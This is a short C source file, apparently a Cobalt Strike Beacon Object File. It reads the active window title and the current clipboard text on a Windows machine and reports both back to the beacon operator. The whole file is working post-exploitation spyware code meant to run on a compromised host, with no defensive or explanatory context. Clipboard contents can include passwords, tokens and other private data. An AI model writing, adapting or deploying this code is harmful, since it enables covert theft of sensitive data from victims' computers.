#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "beacon.h"

DECLSPEC_IMPORT HWND WINAPI USER32$GetForegroundWindow();
DECLSPEC_IMPORT int WINAPI USER32$GetWindowTextA(HWND, LPSTR *, int);
DECLSPEC_IMPORT BOOL WINAPI USER32$OpenClipboard(HWND);
DECLSPEC_IMPORT HANDLE WINAPI USER32$GetClipboardData(UINT);
DECLSPEC_IMPORT BOOL WINAPI USER32$CloseClipboard();

void go()
{
    LPSTR windowsName[250];
    int maxSizeName = 250;
    HWND foreground = USER32$GetForegroundWindow();
    USER32$GetWindowTextA(foreground, windowsName, maxSizeName);
    HANDLE h;

    if (!USER32$OpenClipboard(NULL))
        BeaconPrintf(CALLBACK_OUTPUT, "ERROR\n");
    else
    {
	h = USER32$GetClipboardData(CF_TEXT);

	BeaconPrintf(CALLBACK_OUTPUT, "[+] Clipboard updated !\n[!]Active Windows : %s\n[!] Content : %s\n----------------------------------\n", windowsName, (char*)h);
	USER32$CloseClipboard();
    }
}
